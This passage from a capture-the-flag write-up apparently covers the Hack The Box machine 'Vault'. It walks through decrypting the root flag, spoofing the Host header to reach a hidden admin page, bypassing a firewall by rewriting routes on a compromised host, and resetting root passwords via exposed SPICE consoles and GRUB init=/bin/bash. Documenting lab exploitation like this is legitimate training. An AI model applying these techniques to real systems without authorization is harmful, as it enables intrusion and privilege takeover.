dave@ubuntu:~$ echo QUBAYA6HPDDBBUPLD4BQCEAAUCMOVUY2GZXH4SL5RXIOQQYVMY4TAUFOZE64YFASXVITKTD56JHDLIHBLW3OQMKSHQDUTH3R6QKT3MUYPL32DYMUVFHTWRVO5Q3YLSY2R4K3RUOYE5YKCP2PAX7S7OJBGMJKKZNW6AVN6WGQNV5FISANQDCYJI656WFAQCIIHXCQCTJXBEBHNHGQIMTF4UAQZXICNPCRCT55AUMRZJEQ2KSYK7C3MIIH7Z7MTYOXRBOHHG2XMUDFPUTD5UXFYGCWKJVOGGBJK56OPHE25OKUQCRGVEVINLLC3PZEIAF6KSLVSOLKZ5DWWU34FH36HGPRFSWRIJPRGS4TJOQC3ZSWTXYPORPUFWEHEDOEOPWHH42565HTDUZ6DPJUIX243DQ45HFPLMYTTUW4UVGBWZ4IVV33LYYIB32QO3ONOHPN5HRCYYFECKYNUVSGMHZINOAPEIDO7RXRVBKMHASOS6WH5KOP2XIV4EGBJGM4E6ZSHXIWSG6EM6ODQHRWOAB3AGSLQ5ZHJBPDQ6LQ2PVUMJPWD2N32FSVCEAXP737LZ56TTDJNZN6J6OWZRTP6PBOERHXMQ3ZMYJIUWQF5GXGYOYAZ3MCF75KFJTQAU7D6FFWDBVQQJYQR6FNCH3M3Z5B4MXV7B3ZW4NX5UHZJ5STMCTDZY6SPTKQT6G5VTCG6UWOMK3RYKMPA2YTPKVWVNMTC62Q4E6CZWQAPBFU7NM652O2DROUUPLSHYDZ6SZSO72GCDMASI2X3NGDCGRTHQSD5NVYENRSEJBBCWAZTVO33IIRZ5RLTBVR7R4LKKIBZOVUSW36G37M6PD5EZABOBCHNOQL2HV27MMSK3TSQJ4462INFAB6OS7XCSMBONZZ26EZJTC5P42BGMXHE27464GCANQCRUWO5MEZEFU2KVDHUZRMJ6ABNAEEVIH4SS65JXTGKYLE7ED4C3UV66ALCMC767DKJTBKTTAX3UIRVNBQMYRI7XY= | base32 -d > /dev/shm/a.gpg
dave@ubuntu:~$ file /dev/shm/a.gpg 
/dev/shm/a.gpg: PGP RSA encrypted session key - keyid: 10C678C7 31FEBD1 RSA (Encrypt or Sign) 4096b .
dave@ubuntu:~$ gpg -d /dev/shm/a.gpg 

You need a passphrase to unlock the secret key for
user: "david <dave@david.com>"
4096-bit RSA key, ID D1EB1F03, created 2018-07-24 (main key ID 0FDFBFE4)

Enter passphrase:

```

This is promising! I’ll remember the file in dave’s Desktop, `key`:

```

dave@ubuntu:~/Desktop$ cat key 
itscominghome

```

Entering that works and spits out the root flag:

```

gpg: encrypted with 4096-bit RSA key, ID D1EB1F03, created 2018-07-24
      "david <dave@david.com>"
ca468370...

```

## Beyond Root - Additional Paths

### Overview

In addition to the path I showed above, there are a few alternative ways to solve parts of Vault, so I’ll take a moment to walk through them here. This diagram shows the major steps of the box down the middle, with three other paths on either side:

![1553790738818](https://0xdfimages.gitlab.io/img/1553790738818.png)

### Modify Host Header

During initial enumeration, once I’ve found `/sparklays/admin.php`, `/sparklays/login.php`, and `/sparklays/design/`, I kept using `gobuster`, and eventually ran with `-x html` to find `/sparklays/design/design.html`. But looking at the php code for `admin.php`, there’s another path I could have taken to find `design.html`, and I’m told this was actually the intended route.

```

<?php
$username =$_GET["username"];
$domain = $_SERVER["SERVER_NAME"];
$requri = $_SERVER['REQUEST_URI'];
if (($domain == "localhost") )  {
   Header( "Welcome Dave" );
   header("location: sparklays-local-admin-interface-0001.php
  ");
}
else if (($username == "dave")) {
  setcookie(sparklaysdatastorage.htb-unbreakable-cookie);
}
?>

```

It reads the Host header out of the http request, and if it is “localhost”, then it redirects to a different page that `gobuster` would not have found.

I’ll set Burp intercept on, and then visit `admin.php`:

![1554373987370](https://0xdfimages.gitlab.io/img/1554373987370.png)

I’ll change `10.10.10.109` to `localhost`, and hit forward. Immediately, Burp intercepts another request for a page I did not find with `gobuster`:

![1554374041372](https://0xdfimages.gitlab.io/img/1554374041372.png)

If I look at the HTTP history in Burp, I’ll see the response to the previous request was a 302:

![1554374085770](https://0xdfimages.gitlab.io/img/1554374085770.png)

When I let that go through, my browser is at a new admin panel:

![1554374116107](https://0xdfimages.gitlab.io/img/1554374116107.png)

The first link takes me to a page with no working links:

![1554374138107](https://0xdfimages.gitlab.io/img/1554374138107.png)

But the second takes me to `design.html`.

There’s also the `else if` in the php if the usename is dave. I tried logging in as dave, and an extra cookie does come back in the response:

```

HTTP/1.1 200 OK
Date: Thu, 04 Apr 2019 10:26:54 GMT
Server: Apache/2.4.18 (Ubuntu)
Set-Cookie: 0=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0
Vary: Accept-Encoding
Content-Length: 615
Connection: close
Content-Type: text/html; charset=UTF-8

```

As far as I can tell, it doesn’t do anything.

### Firewall Bypass

The first time I solved this box, this is actually the path I took.

Looking at the network, I’ll map out something like this:

![](https://0xdfimages.gitlab.io/img/vault-networkmap.png)

But because of how the VMs are set up, it’s actually more like this:

![1553788338241](https://0xdfimages.gitlab.io/img/1553788338241.png)

Since I’m not root on ubuntu, it’s difficult to mess with the network config there. I will launch my firewall bypass from DNS, since I have root there.

I’ll add a second IP address to the `ens3` adapter:

```

root@DNS:/home/dave# ip addr add 192.168.5.3/24 dev ens3                                                                                                                                                                   
root@DNS:/home/dave# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: ens3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 52:54:00:17:ab:49 brd ff:ff:ff:ff:ff:ff
    inet 192.168.122.4/24 brd 192.168.122.255 scope global ens3
       valid_lft forever preferred_lft forever
    inet 192.168.5.3/24 scope global ens3
       valid_lft forever preferred_lft forever
    inet6 fe80::5054:ff:fe17:ab49/64 scope link
       valid_lft forever preferred_lft forever

```

If I look at the routing table, I still have an entry that says the gateway for 192.168.5.0/24 is 192.168.122.5, the firewall:

```

root@DNS:/home/dave# route
Kernel IP routing table                                                        
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
192.168.5.0     192.168.122.5   255.255.255.0   UG    0      0        0 ens3
192.168.5.0     *               255.255.255.0   U     0      0        0 ens3
192.168.122.0   *               255.255.255.0   U     0      0        0 ens3

```

I’ll delete that:

```

root@DNS:/home/dave# route delete -net 192.168.5.0 gw 192.168.122.5 netmask 255.255.255.0

```

Now I have direct access to the 192.168.5.0/24 network.

I can look for hosts:

```

root@DNS:/home/dave# time for i in $(seq 1 254); do (ping -c 1 192.168.5.${i} | grep "bytes from" &); done
64 bytes from 192.168.5.2: icmp_seq=1 ttl=64 time=0.983 ms  <-- vault?
64 bytes from 192.168.5.1: icmp_seq=1 ttl=64 time=4.46 ms   <-- firewall
64 bytes from 192.168.5.3: icmp_seq=1 ttl=64 time=0.015 ms  <-- me

real    0m0.676s
user    0m0.008s
sys     0m0.028s

```

I can `nmap` the new box, and see it’s ssh on 987:

```

dave@DNS:/var/www/DNS$ nmap -sT -p- --min-rate 10000 192.168.5.2                      

Starting Nmap 7.01 ( https://nmap.org ) at 2018-11-06 19:47 GMT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for Vault (192.168.5.2)
Host is up (0.0026s latency).
Not shown: 65534 closed ports
PORT    STATE SERVICE                                 
987/tcp open  unknown
                                                
Nmap done: 1 IP address (1 host up) scanned in 94.19 seconds

dave@DNS:/var/www/DNS$ nc 192.168.5.2 987                       
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4

```

I can connect directly to it:

```

dave@DNS:/var/www/DNS$ ssh dave@192.168.5.2 -p 987 -t bash
dave@192.168.5.2's password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic i686)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

96 packages can be updated.
49 updates are security updates.

Last login: Tue Nov  6 19:48:48 2018 from 192.168.5.250
dave@vault:~$ 

```

When I’m done, I’ll clean up, re-adding the route and deleting the ip:

```

root@DNS:/home/dave# route add -net 192.168.5.0 gw 192.168.122.5 netmask 255.255.255.0
root@DNS:/home/dave# ip addr del 192.168.5.3/24 dev ens3

```

### SPICE

#### Background

The [Simple Protocol for Independent Computing Environments](https://en.wikipedia.org/wiki/Simple_Protocol_for_Independent_Computing_Environments) (SPICE) is a remote display protocol built for VMs. With a spice client, you can connect to a virtual machine as if you are sitting at it. Shoutout to [vajkdry](https://www.hackthebox.eu/home/users/profile/94857) for tipping me to this technique.

#### spice In ps

From ubuntu, if I look at the process list and the full command lines, I’ll see the three VMs running under `qemu`:

```

dave@ubuntu:~$ ps -auxww | grep -F 'spice port'
libvirt+   1678  0.4 15.9 2122628 642348 ?      Sl   Feb24  24:57 qemu-system-x86_64 -enable-kvm -name Vault -S -machine pc-i440fx-xenial,accel=kvm,usb=off -cpu qemu32 -m 1024 -realtime mlock=off -smp 1,sockets=1,cores=1,threads=1 -uuid 5c8d1542-2e9b-405a-a1a1-5435f25bf154 -no-user-config -nodefaults -chardev socket,id=charmonitor,path=/var/lib/libvirt/qemu/domain-Vault/monitor.sock,server,nowait -mon chardev=charmonitor,id=monitor,mode=control -rtc base=utc,driftfix=slew -global kvm-pit.lost_tick_policy=discard -no-hpet -no-shutdown -global PIIX4_PM.disable_s3=1 -global PIIX4_PM.disable_s4=1 -boot strict=on -device ich9-usb-ehci1,id=usb,bus=pci.0,addr=0x6.0x7 -device ich9-usb-uhci1,masterbus=usb.0,firstport=0,bus=pci.0,multifunction=on,addr=0x6 -device ich9-usb-uhci2,masterbus=usb.0,firstport=2,bus=pci.0,addr=0x6.0x1 -device ich9-usb-uhci3,masterbus=usb.0,firstport=4,bus=pci.0,addr=0x6.0x2 -device virtio-serial-pci,id=virtio-serial0,bus=pci.0,addr=0x5 -drive file=/var/lib/libvirt/images/Vault.qcow2,format=qcow2,if=none,id=drive-ide0-0-0 -device ide-hd,bus=ide.0,unit=0,drive=drive-ide0-0-0,id=ide0-0-0,bootindex=1 -drive if=none,id=drive-ide0-0-1,readonly=on -device ide-cd,bus=ide.0,unit=1,drive=drive-ide0-0-1,id=ide0-0-1 -netdev tap,fd=25,id=hostnet0 -device rtl8139,netdev=hostnet0,id=net0,mac=52:54:00:c6:70:66,bus=pci.0,addr=0x3 -chardev pty,id=charserial0 -device isa-serial,chardev=charserial0,id=serial0 -chardev spicevmc,id=charchannel0,name=vdagent -device virtserialport,bus=virtio-serial0.0,nr=1,chardev=charchannel0,id=channel0,name=com.redhat.spice.0 -spice port=5900,addr=127.0.0.1,disable-ticketing,image-compression=off,seamless-migration=on -device qxl-vga,id=video0,ram_size=67108864,vram_size=67108864,vgamem_mb=16,bus=pci.0,addr=0x2 -device intel-hda,id=sound0,bus=pci.0,addr=0x4 -device hda-duplex,id=sound0-codec0,bus=sound0.0,cad=0 -chardev spicevmc,id=charredir0,name=usbredir -device usb-redir,chardev=charredir0,id=redir0 -chardev spicevmc,id=charredir1,name=usbredir -device usb-redir,chardev=charredir1,id=redir1 -device virtio-balloon-pci,id=balloon0,bus=pci.0,addr=0x7 -msg timestamp=on
libvirt+   1844  0.4 17.0 2133120 682860 ?      Sl   Feb24  25:40 qemu-system-x86_64 -enable-kvm -name Firewall -S -machine pc-i440fx-xenial,accel=kvm,usb=off -cpu qemu32 -m 1024 -realtime mlock=off -smp 1,sockets=1,cores=1,threads=1 -uuid cd3065e0-8cff-4ca0-99e8-9f2b545467a8 -no-user-config -nodefaults -chardev socket,id=charmonitor,path=/var/lib/libvirt/qemu/domain-Firewall/monitor.sock,server,nowait -mon chardev=charmonitor,id=monitor,mode=control -rtc base=utc,driftfix=slew -global kvm-pit.lost_tick_policy=discard -no-hpet -no-shutdown -global PIIX4_PM.disable_s3=1 -global PIIX4_PM.disable_s4=1 -boot strict=on -device ich9-usb-ehci1,id=usb,bus=pci.0,addr=0x7.0x7 -device ich9-usb-uhci1,masterbus=usb.0,firstport=0,bus=pci.0,multifunction=on,addr=0x7 -device ich9-usb-uhci2,masterbus=usb.0,firstport=2,bus=pci.0,addr=0x7.0x1 -device ich9-usb-uhci3,masterbus=usb.0,firstport=4,bus=pci.0,addr=0x7.0x2 -device virtio-serial-pci,id=virtio-serial0,bus=pci.0,addr=0x6 -drive file=/var/lib/libvirt/images/Firewall.qcow2,format=qcow2,if=none,id=drive-ide0-0-0 -device ide-hd,bus=ide.0,unit=0,drive=drive-ide0-0-0,id=ide0-0-0,bootindex=1 -drive if=none,id=drive-ide0-0-1,readonly=on -device ide-cd,bus=ide.0,unit=1,drive=drive-ide0-0-1,id=ide0-0-1 -netdev tap,fd=26,id=hostnet0 -device rtl8139,netdev=hostnet0,id=net0,mac=52:54:00:3a:3b:d5,bus=pci.0,addr=0x3 -netdev tap,fd=28,id=hostnet1 -device rtl8139,netdev=hostnet1,id=net1,mac=52:54:00:e1:74:41,bus=pci.0,addr=0x4 -chardev pty,id=charserial0 -device isa-serial,chardev=charserial0,id=serial0 -chardev spicevmc,id=charchannel0,name=vdagent -device virtserialport,bus=virtio-serial0.0,nr=1,chardev=charchannel0,id=channel0,name=com.redhat.spice.0 -spice port=5901,addr=127.0.0.1,disable-ticketing,image-compression=off,seamless-migration=on -device qxl-vga,id=video0,ram_size=67108864,vram_size=67108864,vgamem_mb=16,bus=pci.0,addr=0x2 -device intel-hda,id=sound0,bus=pci.0,addr=0x5 -device hda-duplex,id=sound0-codec0,bus=sound0.0,cad=0 -chardev spicevmc,id=charredir0,name=usbredir -device usb-redir,chardev=charredir0,id=redir0 -chardev spicevmc,id=charredir1,name=usbredir -device usb-redir,chardev=charredir1,id=redir1 -device virtio-balloon-pci,id=balloon0,bus=pci.0,addr=0x8 -msg timestamp=on
libvirt+   1947  0.3 17.1 2120304 687184 ?      Sl   Feb24  21:00 qemu-system-x86_64 -enable-kvm -name DNS -S -machine pc-i440fx-xenial,accel=kvm,usb=off -cpu qemu32 -m 1024 -realtime mlock=off -smp 1,sockets=1,cores=1,threads=1 -uuid 4c7b43f8-23d1-4e7d-a219-d55eb0c899a6 -no-user-config -nodefaults -chardev socket,id=charmonitor,path=/var/lib/libvirt/qemu/domain-DNS/monitor.sock,server,nowait -mon chardev=charmonitor,id=monitor,mode=control -rtc base=utc,driftfix=slew -global kvm-pit.lost_tick_policy=discard -no-hpet -no-shutdown -global PIIX4_PM.disable_s3=1 -global PIIX4_PM.disable_s4=1 -boot strict=on -device ich9-usb-ehci1,id=usb,bus=pci.0,addr=0x6.0x7 -device ich9-usb-uhci1,masterbus=usb.0,firstport=0,bus=pci.0,multifunction=on,addr=0x6 -device ich9-usb-uhci2,masterbus=usb.0,firstport=2,bus=pci.0,addr=0x6.0x1 -device ich9-usb-uhci3,masterbus=usb.0,firstport=4,bus=pci.0,addr=0x6.0x2 -device virtio-serial-pci,id=virtio-serial0,bus=pci.0,addr=0x5 -drive file=/var/lib/libvirt/images/DNS.qcow2,format=qcow2,if=none,id=drive-ide0-0-0 -device ide-hd,bus=ide.0,unit=0,drive=drive-ide0-0-0,id=ide0-0-0,bootindex=1 -drive if=none,id=drive-ide0-0-1,readonly=on -device ide-cd,bus=ide.0,unit=1,drive=drive-ide0-0-1,id=ide0-0-1 -netdev tap,fd=27,id=hostnet0 -device rtl8139,netdev=hostnet0,id=net0,mac=52:54:00:17:ab:49,bus=pci.0,addr=0x3 -chardev pty,id=charserial0 -device isa-serial,chardev=charserial0,id=serial0 -chardev spicevmc,id=charchannel0,name=vdagent -device virtserialport,bus=virtio-serial0.0,nr=1,chardev=charchannel0,id=channel0,name=com.redhat.spice.0 -spice port=5902,addr=127.0.0.1,disable-ticketing,image-compression=off,seamless-migration=on -device qxl-vga,id=video0,ram_size=67108864,vram_size=67108864,vgamem_mb=16,bus=pci.0,addr=0x2 -device intel-hda,id=sound0,bus=pci.0,addr=0x4 -device hda-duplex,id=sound0-codec0,bus=sound0.0,cad=0 -chardev spicevmc,id=charredir0,name=usbredir -device usb-redir,chardev=charredir0,id=redir0 -chardev spicevmc,id=charredir1,name=usbredir -device usb-redir,chardev=charredir1,id=redir1 -device virtio-balloon-pci,id=balloon0,bus=pci.0,addr=0x7 -msg timestamp=on

```

In each of those command lines, there’s an argument that looks like `-spice port=5902,addr=127.0.0.1,disable-ticketing,image-compression=off,seamless-migration=on`. There I have the port and IP to connect to for remote desktop access.

On each boot, each of the three VMs ports will swap around, but in this process list, above:
- Vault = 5900
- Firewall = 5901
- DNS = 5902

#### Install Client and Connect

To connect to spice, I’ll need a client. `remmina` is a good one:

```

root@kali# apt install remmina remmina-plugin-spice

```

Now I’ll use ssh port forwarding to forward the spice port on my localhost to the port on ubuntu. Then I’ll open `remmina` and connect to localhost:port over spice:

![1551984682675](https://0xdfimages.gitlab.io/img/1551984682675.png)

#### Reset Password

Just like on a physical machine when you forget your password, I can go into recovery mode to reset the root password.
1. Send ctrl+alt+delete to reboot
   ![1551984700188](https://0xdfimages.gitlab.io/img/1551984700188.png)
2. Click inside window to capture keyboard, and hold shift to prevent Grub menu was continuing
   ![1551985155415](https://0xdfimages.gitlab.io/img/1551985155415.png)
3. With Ubuntu selected, hit `e`, and it will show:
   ![1551985181069](https://0xdfimages.gitlab.io/img/1551985181069.png)
4. Scroll down to the line that starts with `linux`:
   ![1551985216598](https://0xdfimages.gitlab.io/img/1551985216598.png)
5. Change `ro` to `rw`, and add `init=/bin/bash` to the end
   ![1551985258838](https://0xdfimages.gitlab.io/img/1551985258838.png)
6. Ctrl+x to save and boot. After a long boot, I’m at a root prompt:
   ![1551985349915](https://0xdfimages.gitlab.io/img/1551985349915.png)
7. Enter `passwd` to change root password
8. Send ctrl+alt+del to reboot again

#### Login

Now from the same terminal I can log in as root with the new password, and get `root.txt.gpg`:

![1551986328078](https://0xdfimages.gitlab.io/img/1551986328078.png)

I mentioned above that `base64` wasn’t on the box. Above I used python to get the file as base64.

Unfortunately, this part is tedious. The fastest thing to do here it type it out. Luckily it’s not long.

I looked into OCR options, and the free ones I could find didn’t do good enough to make it worth the time.

### Firewall Rules

Using the same method, I was able to log into the Firewall and check out the IpTables ruleset:

![1551384921444](https://0xdfimages.gitlab.io/img/1551384921444.png)

It allows anything with source or destination of 4444 or domain (53) to go through. That’s why when I scanned with `nmap` without specifying the source port I got back that 53 and 4444 were closed. They made it through the firewall, and the box responded, whereas all the other ports never made it to vault.

The last two rules may be redundant. For example, the first rule accepts anything with tcp source 53. The second to last (not counting the DROP all) accepts traffic to 192.168.122.4 (DNS) with source 53 and destination 987.